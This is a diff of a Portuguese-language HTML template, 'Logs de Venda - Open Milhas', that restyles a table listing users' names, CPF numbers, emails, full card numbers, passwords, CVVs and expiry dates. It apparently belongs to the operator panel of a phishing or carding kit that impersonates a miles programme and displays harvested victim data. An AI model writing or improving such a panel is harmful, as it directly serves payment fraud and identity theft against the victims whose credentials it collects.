@@ -8,23 +8,26 @@
 <body class="bg-dark text-white p-4">
     <div class="container-fluid">
         <h2 class="mb-4">Logs de Venda - Open Milhas</h2>
-        <table class="table table-dark table-striped table-bordered">
-            <thead>
-                <tr>
-                    <th>ID</th><th>Nome</th><th>CPF</th><th>Email</th>
-                    <th>Cartão</th><th>Senha</th><th>CVV</th><th>Validade</th>
-                </tr>
-            </thead>
-            <tbody>
-                {% for u in usuarios %}
-                <tr>
-                    <td>{{ u[0] }}</td><td>{{ u[1] }}</td><td>{{ u[2] }}</td><td>{{ u[3] }}</td>
-                    <td class="text-warning">{{ u[4] }}</td><td class="text-danger">{{ u[5] }}</td>
-                    <td>{{ u[6] }}</td><td>{{ u[7] }}</td>
-                </tr>
-                {% endfor %}
-            </tbody>
-        </table>
+        <div class="table-responsive">
+            <table class="table table-dark table-striped table-bordered align-middle">
+                <thead>
+                    <tr>
+                        <th>ID</th><th>Nome</th><th>CPF</th><th>Email</th>
+                        <th>Número do Cartão</th><th>Senha</th><th>CVV</th><th>Validade</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% for u in usuarios %}
+                    <tr>
+                        <td>{{ u[0] }}</td><td>{{ u[1] }}</td><td>{{ u[2] }}</td><td>{{ u[3] }}</td>
+                        <td class="text-warning fw-bold">{{ u[4] }}</td>
+                        <td class="text-danger fw-bold">{{ u[5] }}</td>
+                        <td>{{ u[6] }}</td><td>{{ u[7] }}</td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
     </div>
 </body>
 </html>
